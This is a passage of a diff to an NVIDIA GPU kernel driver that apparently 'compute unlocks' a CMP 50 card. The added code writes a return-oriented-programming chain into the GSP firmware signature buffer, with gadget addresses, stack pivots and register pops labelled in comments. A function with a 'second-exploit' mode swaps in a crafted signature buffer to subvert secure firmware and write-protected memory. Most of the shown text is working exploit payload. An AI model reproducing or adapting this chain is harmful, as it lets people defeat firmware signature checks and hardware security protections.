+        _kgspCmp50PutU32(pSignatureVa, 0xBBB0, 0x00000CBDU); /* r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBB4, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBB8, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBBC, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC0, 0x00000454U); /* WprMeta size high */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC4, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC8, 0x00000C1DU); /* DMEM store */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBCC, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD0, 0x0000277BU); /* continuation */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD4, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD8, 0x00000CBDU); /* r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBDC, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE8, 0x0000FF4CU); /* saved RA */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBEC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF0, 0x00000C1DU); /* DMEM store */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF4, 0x00000400U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF8, 0x00000000U); /* pop r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBFC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC00, 0x000005FFU); /* pop r0-r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC04, 0x0000FF0CU); /* r6/pivot */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC08, 0x00000000U); /* r5 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC0C, 0x00000000U); /* r4 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC10, 0x00000000U); /* r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC14, 0x00000000U); /* r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC18, 0x00000400U); /* r1/meta */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC1C, 0x00000000U); /* r0/status */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC20, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC24, 0x000064ECU); /* tail pivot */
+#endif
+        NV_PRINTF(LEVEL_ERROR,
+                  "CMP50_COMPUTE_UNLOCK_V526: signed fullspeed stock-relock WPR-down commit "
+                  "FECS=0xffffff8f SS0=0x88888888 SS1=8 "
+                  "WPR2=0:0x1ffffe00 RESET_PLM=0xff ACR_TOKEN=0xc2 MB0=0 MB1=0 "
+                  "header=0x00020001 ls_version=0x344 ls_id=1 tail=0x3988 "
+                  "mutex_release=0x0d27 mailbox=0x1cdd cleanup=0x7c43@0xbd6c "
+                  "g_resetPLM=f stack=0xff14 "
+                  "stage=0xc100 gadgets=0x0cc8,0x0cbd,0x0c1d,"
+                  "0x1d62,0x1f89,0x5ff,0x64ec\n");
+    }
+
     else
     {
         portMemCopy(pSignatureVa, memdescGetSize(pKernelGsp->pSignatureMemdesc),
@@ -7260,6 +7657,12 @@ _kgspCreateSignatureMemdesc
     return status;
 
 fail_alloc:
+    if (bCmp50PcCanary && pKernelGsp->pStockSignatureData != NULL)
+    {
+        portMemFree(pKernelGsp->pStockSignatureData);
+        pKernelGsp->pStockSignatureData = NULL;
+        pKernelGsp->stockSignatureSize = 0;
+    }
     memdescFree(pKernelGsp->pSignatureMemdesc);
 
 fail_create:
@@ -7329,6 +7732,194 @@ rebuild_fail_create:
     memdescDestroy(pKernelGsp->pSignatureMemdesc);
     pKernelGsp->pSignatureMemdesc = NULL;
 
+    return status;
+}
+
+NV_STATUS
+kgspCmp50RebuildStockSignature
+(
+    OBJGPU *pGpu,
+    KernelGsp *pKernelGsp
+)
+{
+    NvU8 *pSignatureVa = NULL;
+    NvU64 backingSize;
+    NvU64 stockAdvertisedSize;
+
+    if ((pKernelGsp->pSignatureMemdesc == NULL) ||
+        (pKernelGsp->pStockSignatureData == NULL) ||
+        (pKernelGsp->stockSignatureSize == 0))
+    {
+        return NV_ERR_INVALID_STATE;
+    }
+
+    backingSize = memdescGetSize(pKernelGsp->pSignatureMemdesc);
+    stockAdvertisedSize =
+        NV_ALIGN_UP(pKernelGsp->stockSignatureSize, 256);
+    if (stockAdvertisedSize > backingSize)
+    {
+        return NV_ERR_INSUFFICIENT_RESOURCES;
+    }
+
+    pSignatureVa = memdescMapInternal(
+        pGpu, pKernelGsp->pSignatureMemdesc, TRANSFER_FLAGS_NONE);
+    if (pSignatureVa == NULL)
+    {
+        return NV_ERR_INSUFFICIENT_RESOURCES;
+    }
+
+    portMemSet(pSignatureVa, 0, backingSize);
+    portMemCopy(pSignatureVa, backingSize,
+                pKernelGsp->pStockSignatureData,
+                pKernelGsp->stockSignatureSize);
+    memdescUnmapInternal(pGpu, pKernelGsp->pSignatureMemdesc, 0);
+    pSignatureVa = NULL;
+    memdescFlushCpuCaches(pGpu, pKernelGsp->pSignatureMemdesc);
+
+    if (SEC2_POSTBL_TIMING_WPR_META(pKernelGsp) != NULL)
+    {
+        SEC2_POSTBL_TIMING_WPR_META(pKernelGsp)->sysmemAddrOfSignature =
+            memdescGetPhysAddr(pKernelGsp->pSignatureMemdesc, AT_GPU, 0);
+        SEC2_POSTBL_TIMING_WPR_META(pKernelGsp)->sizeOfSignature = stockAdvertisedSize;
+    }
+    if (SEC2_POSTBL_TIMING_WPR_META_DESC(pKernelGsp) != NULL)
+    {
+        memdescFlushCpuCaches(pGpu, SEC2_POSTBL_TIMING_WPR_META_DESC(pKernelGsp));
+    }
+
+    NV_PRINTF(LEVEL_ERROR,
+              "CMP50_COMPUTE_UNLOCK_V132: restored stock signature in-place "
+              "phys=0x%llx backing=0x%llx advertised=0x%llx\n",
+              memdescGetPhysAddr(
+                  pKernelGsp->pSignatureMemdesc, AT_GPU, 0),
+              backingSize, stockAdvertisedSize);
+    return NV_OK;
+}
+
+NV_STATUS
+kgspCmp50ReplaceSignature
+(
+    OBJGPU *pGpu,
+    KernelGsp *pKernelGsp,
+    NvBool bSecondExploit
+)
+{
+    NV_STATUS status = NV_OK;
+    MEMORY_DESCRIPTOR *pOldMemdesc = pKernelGsp->pSignatureMemdesc;
+    MEMORY_DESCRIPTOR *pNewMemdesc = NULL;
+    NvU8 *pSignatureVa = NULL;
+    NvU64 newSize;
+    NvU64 i;
+    NvU64 flags = MEMDESC_FLAGS_ALLOC_IN_UNPROTECTED_MEMORY;
+
+    if ((pOldMemdesc == NULL) ||
+        (pKernelGsp->pStockSignatureData == NULL) ||
+        (pKernelGsp->stockSignatureSize == 0) ||
+        (SEC2_POSTBL_TIMING_WPR_META(pKernelGsp) == NULL))
+    {
+        return NV_ERR_INVALID_STATE;
+    }
+
+    newSize = bSecondExploit ? CMP50_PC_CANARY_SIGNATURE_SIZE :
+        NV_ALIGN_UP(pKernelGsp->stockSignatureSize, 256);
+    NV_CHECK_OK_OR_GOTO(status, LEVEL_ERROR,
+        memdescCreate(&pNewMemdesc, pGpu, newSize, 256,
+            NV_TRUE, ADDR_SYSMEM, NV_MEMORY_CACHED, flags), fail);
+    memdescTagAlloc(status,
+        NV_FB_ALLOC_RM_INTERNAL_OWNER_UNNAMED_TAG_16, pNewMemdesc);
+    NV_CHECK_OK_OR_GOTO(status, LEVEL_ERROR, status, fail);
+
+    pSignatureVa = memdescMapInternal(
+        pGpu, pNewMemdesc, TRANSFER_FLAGS_NONE);
+    NV_CHECK_OK_OR_GOTO(status, LEVEL_ERROR,
+        (pSignatureVa != NULL) ? NV_OK : NV_ERR_INSUFFICIENT_RESOURCES,
+        fail);
+
+    if (!bSecondExploit)
+    {
+        portMemSet(pSignatureVa, 0, newSize);
+        portMemCopy(pSignatureVa, newSize,
+                    pKernelGsp->pStockSignatureData,
+                    pKernelGsp->stockSignatureSize);
+    }
+    else
+    {
+        for (i = 0; i + sizeof(NvU32) <= newSize; i += sizeof(NvU32))
+        {
+            _kgspCmp50PutU32(pSignatureVa, (NvU32)i,
+                             CMP50_PC_CANARY_UNIFORM_DWORD);
+        }
+        _kgspCmp50PutU32(pSignatureVa, 0xF94C, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF950, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF954, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF958, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF95C, 0xFFFFFFFFU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF960, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF964, 0x00000CBDU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF968, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF96C, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF970, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF974, 0x00409650U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF978, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF97C, 0x00001F89U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF980, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF984, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF988, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF98C, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF990, 0x000010AAU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF994, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF998, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF99C, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A0, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A4, 0xFFFFFFFFU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A8, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9AC, 0x00000CBDU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B0, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B4, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B8, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9BC, 0x008403C4U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C0, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C4, 0x00001F89U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C8, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9CC, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D0, 0x00000000U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D4, 0x00000CC8U);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D8, 0x000010AAU);
+        _kgspCmp50PutU32(pSignatureVa, 0xF9DC, 0x00007C34U);
+    }
+
+    memdescUnmapInternal(pGpu, pNewMemdesc, 0);
+    pSignatureVa = NULL;
+    memdescFlushCpuCaches(pGpu, pNewMemdesc);
+
+    pKernelGsp->pSignatureMemdesc = pNewMemdesc;
+    SEC2_POSTBL_TIMING_WPR_META(pKernelGsp)->sysmemAddrOfSignature =
+        memdescGetPhysAddr(pNewMemdesc, AT_GPU, 0);
+    SEC2_POSTBL_TIMING_WPR_META(pKernelGsp)->sizeOfSignature = newSize;
+    if (SEC2_POSTBL_TIMING_WPR_META_DESC(pKernelGsp) != NULL)
+    {
+        memdescFlushCpuCaches(pGpu, SEC2_POSTBL_TIMING_WPR_META_DESC(pKernelGsp));
+    }
+
+    memdescFree(pOldMemdesc);
+    memdescDestroy(pOldMemdesc);
+    NV_PRINTF(LEVEL_ERROR,
+              "CMP50_COMPUTE_UNLOCK_V132: signature buffer replaced "
+              "mode=%s phys=0x%llx size=0x%llx\n",
+              bSecondExploit ? "second-exploit" : "stock",
+              memdescGetPhysAddr(pNewMemdesc, AT_GPU, 0), newSize);
+    return NV_OK;
+
+fail:
+    if (pSignatureVa != NULL)
+    {
+        memdescUnmapInternal(pGpu, pNewMemdesc, 0);
+    }
+    if (pNewMemdesc != NULL)
+    {
+        memdescFree(pNewMemdesc);
+        memdescDestroy(pNewMemdesc);
+    }
     return status;
 }
 
